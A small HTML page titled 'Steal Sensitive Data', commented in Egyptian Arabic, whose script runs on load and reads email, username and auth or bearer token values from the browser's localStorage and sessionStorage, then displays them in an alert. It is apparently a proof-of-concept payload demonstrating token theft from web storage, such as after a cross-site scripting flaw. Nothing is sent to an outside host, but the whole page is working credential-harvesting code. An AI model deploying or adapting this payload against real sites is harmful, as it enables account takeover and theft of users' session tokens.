<!DOCTYPE html>
<html>
<head>
  <title>Steal Sensitive Data</title>
  <script>
    window.onload = function() {
      try {
        // هنا نعرف المفاتيح اللي بنبحث عنها تحديدًا
        const keysOfInterest = ['email', 'user', 'username', 'token', 'auth', 'bearer'];

        // وظيفة تساعدنا نجيب القيمة من localStorage أو sessionStorage
        function findKey(keys) {
          for (const key of keys) {
            let val = localStorage.getItem(key);
            if (val) return {key, val, source: 'localStorage'};

            val = sessionStorage.getItem(key);
            if (val) return {key, val, source: 'sessionStorage'};
          }
          return null;
        }

        // نحاول نجيب أول قيمة موجودة من المفاتيح دي
        const emailData = findKey(keysOfInterest.filter(k => k.includes('email')));
        const userData = findKey(keysOfInterest.filter(k => k.includes('user')));
        const tokenData = findKey(keysOfInterest.filter(k => ['token','auth','bearer'].includes(k)));

        // نعرض النتائج في alert
        alert(`
📧 Email: ${emailData ? emailData.val : 'Not found'}
👤 User: ${userData ? userData.val : 'Not found'}
🔑 Token: ${tokenData ? tokenData.val : 'Not found'}
        `);

      } catch (e) {
        alert('Error: ' + e.message);
      }
    };
  </script>
</head>
<body>
  <h1>Fetching sensitive data...</h1>
</body>
</html>
